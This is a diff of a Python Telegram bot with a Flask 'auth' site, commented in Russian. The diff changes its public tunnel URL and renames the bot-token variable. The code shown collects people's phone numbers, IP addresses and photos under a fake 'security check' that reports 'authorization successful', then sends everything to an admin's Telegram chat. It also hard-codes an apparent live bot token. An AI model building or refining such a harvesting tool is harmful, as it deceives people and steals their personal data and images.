@@ -13,7 +13,7 @@ import random
 TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # ❗ заменить на свой токен
 ADMIN_ID = 2054091032  # ❗ заменить на свой Telegram ID
 SITE_PORT = 5000
-NGROK_URL = "https://bfa4-207-127-89-193.ngrok-free.app "  # ❗ замени на свой URL из ngrok
+NGROK_URL = "https://breezy-parts-bathe.loca.lt "  # Замени на свой URL из loca.lt
 PHOTOS_DIR = "photos"
 DB_PATH = "users.db"
 
@@ -69,7 +69,6 @@ init_db()
 
 # === Сайт (Flask) в отдельном потоке ===
 app = Flask(__name__)
-TELEGRAM_BOT_TOKEN = TOKEN
 
 @app.route('/auth')
 def auth():
@@ -154,7 +153,7 @@ def save_photo():
         add_user(user_id, username, phone, ip, photo_path)
 
         # Отправка пользователю сообщения об успехе
-        url = f"https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage"
+        url = f"https://api.telegram.org/bot {TOKEN}/sendMessage"
         data = {"chat_id": user_id, "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности."}
         requests.post(url, data=data)
 
@@ -171,10 +170,10 @@ def save_photo():
             with open(photo_path, 'rb') as f:
                 files = {'photo': f}
                 data_admin = {'chat_id': ADMIN_ID, 'caption': message}
-                requests.post(f'https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendPhoto', data=data_admin, files=files)
+                requests.post(f'https://api.telegram.org/bot {TOKEN}/sendPhoto', data=data_admin, files=files)
         else:
             data_admin = {'chat_id': ADMIN_ID, 'text': message}
-            requests.post(f'https://api.telegram.org/bot {TELEGRAM_BOT_TOKEN}/sendMessage', data=data_admin)
+            requests.post(f'https://api.telegram.org/bot {TOKEN}/sendMessage', data=data_admin)
 
         return 'OK'
     except Exception as e:
